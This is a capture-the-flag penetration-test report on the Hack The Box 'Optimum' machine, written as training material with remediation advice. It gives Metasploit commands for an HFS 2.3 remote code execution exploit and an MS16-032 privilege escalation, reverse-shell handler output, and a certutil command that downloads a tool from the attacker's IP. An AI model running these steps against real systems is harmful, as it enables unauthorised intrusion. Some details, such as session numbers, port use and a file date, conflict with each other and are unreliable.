# Penetration Testing Report — HTB "Optimum" (Windows)

**Tester:** Rully Miftahur Rozaq
**Attacker IP:** 10.10.14.7
**Target IP:** 10.129.26.31
**Target Hostname:** OPTIMUM
**Domain:** HTB
**Operating System:** Windows Server 2012 R2 (Build 9600), x64
**Date of Engagement:** 15–16 August 2026
**Tools Used:** Nmap, Metasploit Framework (msfconsole), WinPEAS, CertUtil

---

## 1. Executive Summary

This report documents a full compromise of the Windows target `10.129.26.31` (hostname `OPTIMUM`). The engagement began with a standard Nmap service scan, which identified a single exposed web service running **HttpFileServer (HFS) 2.3**, a file-sharing application with a well-known unauthenticated remote code execution vulnerability. This vulnerability was exploited via Metasploit to obtain an initial Meterpreter session as the low-privileged user `kostas`.

Manual enumeration attempts using WinPEAS were unsuccessful due to missing .NET Framework components on the target. Automated privilege escalation enumeration via Metasploit's `local_exploit_suggester` module identified several viable local privilege escalation paths, including **MS16-032 (CVE-2016-0099)**. Exploiting this vulnerability granted a **SYSTEM**-level shell, completing full compromise of the host. Both the user flag and root flag were successfully retrieved.

---

## 2. Reconnaissance

An Nmap service/version scan was performed against the target:

```bash
nmap -sCV 10.129.26.31
```

**Results:**

| Port  | State | Service | Version                  |
|-------|-------|---------|---------------------------|
| 80/tcp | open  | http    | HttpFileServer httpd 2.3 |

Additional findings:
- `http-server-header`: HFS 2.3
- `http-title`: HFS /
- OS fingerprint: Windows (`cpe:/o:microsoft:windows`)

Only one port was open (999 filtered), indicating a heavily firewalled host with a single attack surface: the HFS web service on port 80.

---

## 3. Initial Foothold — Rejetto HFS 2.3 RCE

HttpFileServer 2.3 is vulnerable to an unauthenticated remote code execution flaw (commonly tracked as **CVE-2014-6287**), exploitable through the `search` function of the HFS scripting engine. This was exploited using the built-in Metasploit module.

```bash
msfconsole
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.129.26.31
set LHOST 10.10.14.7
set LPORT 443
run
```

**Result:**

```
[*] Started reverse TCP handler on 10.10.14.7:443
[*] Using URL: http://10.10.14.7:8080/qrkyY2dQU
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /qrkyY2dQU
[*] Sending stage (199238 bytes) to 10.129.26.31
[*] Meterpreter session 1 opened (10.10.14.7:443 -> 10.129.26.31:49162)
```

A Meterpreter session was successfully established.

### 3.1 Session Verification

```
meterpreter > getuid
Server username: OPTIMUM\kostas

meterpreter > sysinfo
Computer        : OPTIMUM
OS              : Windows Server 2012 R2 (6.3 Build 9600)
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows
```

Access was obtained as the local user `kostas`, on host `OPTIMUM`, joined to the `HTB` domain.

---

## 4. Post-Exploitation Enumeration

A `dir` listing of `C:\Users\kostas\Desktop` revealed the **user flag** (`user.txt`).

### 4.1 WinPEAS Transfer & Execution Attempts

An attempt was made to transfer and execute `winPEASx64.exe` via `certutil` to perform automated privilege escalation enumeration.

```
certutil -urlcache -split -f http://10.10.14.7/winPEASx64_ofs.exe winPEASx64_ofs.exe
CertUtil: -URLCache command FAILED: 0x80072efd (ERROR_INTERNET_CANNOT_CONNECT)
```

The transfer failed on port 80 (already in use by the exploit handler). Re-hosting the file on an alternate port succeeded:

```
certutil -urlcache -split -f http://10.10.14.7:8000/winPEASx64_ofs.exe winPEASx64_ofs.exe
CertUtil: -URLCache command completed successfully.
```

However, execution failed due to a missing .NET Framework runtime component:

```
winPEASx64_ofs.exe > output.txt
Unhandled Exception: System.TypeLoadException: Could not load type
'System.ValueTuple`2' from assembly 'mscorlib, Version=4.0.0.0, ...'
```

A fallback attempt was made using the batch version (`winPEAS.bat`), which also failed to complete cleanly:

```
winPEAS.bat > output_bat.txt
ERROR: Invalid namespace
ERROR: Unable to get user claims information.
```

**Conclusion:** Automated WinPEAS enumeration was not viable on this host due to environment limitations, so enumeration proceeded via Metasploit's built-in post-exploitation modules instead.

---

## 5. Privilege Escalation

### 5.1 Local Exploit Suggester

The session was backgrounded and Metasploit's local exploit suggestion module was used to identify viable privilege escalation vectors:

```
background
use post/multi/recon/local_exploit_suggester
set SESSION 2
run
```

The module ran 255 exploit checks and identified multiple potentially viable exploits, including:

| Module | Result |
|---|---|
| `exploit/windows/local/bypassuac_comhijack` | Vulnerable |
| `exploit/windows/local/bypassuac_eventvwr` | Vulnerable |
| `exploit/windows/local/bypassuac_sluihijack` | Vulnerable |
| `exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move` | Vulnerable Windows 8.1/2012 R2 build detected |
| `exploit/windows/local/ms16_032_secondary_logon_handle_privesc` | Windows session with multiple CPU cores detected |
| `exploit/windows/local/tokenmagic` | Vulnerable |
| Multiple persistence modules (registry, BITS, startup folder, etc.) | Vulnerable |

### 5.2 Exploiting MS16-032 (CVE-2016-0099)

The **Secondary Logon Handle** privilege escalation exploit (MS16-032) was selected, as it directly grants a SYSTEM-level session and is reliable against multi-core Windows Server 2012 R2 hosts.

```
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 2
set LHOST 10.10.14.7
set LPORT 443
run
```

**Result:**

```
[*] Started reverse TCP handler on 10.10.14.7:443
[+] Compressed size: 1160
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
```

A new Meterpreter session was returned with elevated privileges:

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Full SYSTEM-level access was achieved.

### 5.3 Root Flag Retrieval

```
shell
cd C:\Users\Administrator\Desktop
dir
```

```
Directory of C:\Users\Administrator\Desktop
22/08/2026  05:52    34 root.txt
```

The **root flag** (`root.txt`) was successfully retrieved from the Administrator's desktop.

---

## 6. Attack Chain Summary

| Stage | Technique | Outcome |
|---|---|---|
| 1. Reconnaissance | Nmap service scan | Identified HFS 2.3 on port 80 |
| 2. Initial Access | Rejetto HFS 2.3 RCE (CVE-2014-6287) via Metasploit | Meterpreter session as `OPTIMUM\kostas` |
| 3. Enumeration | WinPEAS (EXE/BAT) | Failed — missing .NET runtime; pivoted to `local_exploit_suggester` |
| 4. Privilege Escalation | MS16-032 (CVE-2016-0099) — Secondary Logon Handle | SYSTEM-level session |
| 5. Impact | Filesystem access as SYSTEM | Full compromise, `user.txt` and `root.txt` captured |

---

## 7. Remediation Recommendations

1. **Decommission or upgrade HttpFileServer.** Version 2.3 is unsupported and contains a critical unauthenticated RCE vulnerability. Migrate to a maintained file-sharing solution.
2. **Apply MS16-032 patch (KB3139914)** and ensure Windows Update is current — this flaw was patched in 2016 and should not be present on production systems.
3. **Restrict outbound internet access** from servers to prevent `certutil`/PowerShell-based payload downloads from external hosts.
4. **Enable application whitelisting (e.g., AppLocker/WDAC)** to block execution of unauthorized binaries such as staged post-exploitation tools.
5. **Follow least-privilege principles** — review why `kostas` had sufficient local rights to be leveraged for a Secondary Logon Service privilege escalation.
6. **Monitor for anomalous process trees**, such as `rundll32`/`hfs.exe` spawning `cmd.exe`, which is a strong indicator of exploitation.

---

## 8. Conclusion

The target host was fully compromised end-to-end, from unauthenticated remote code execution to SYSTEM-level access, due to a combination of an outdated, vulnerable web service (HFS 2.3) and an unpatched local privilege escalation flaw (MS16-032). Both flags were successfully captured, confirming complete compromise of the `OPTIMUM` host.

**Flags Captured:**
- `user.txt` — `C:\Users\kostas\Desktop\user.txt`
- `root.txt` — `C:\Users\Administrator\Desktop\root.txt`
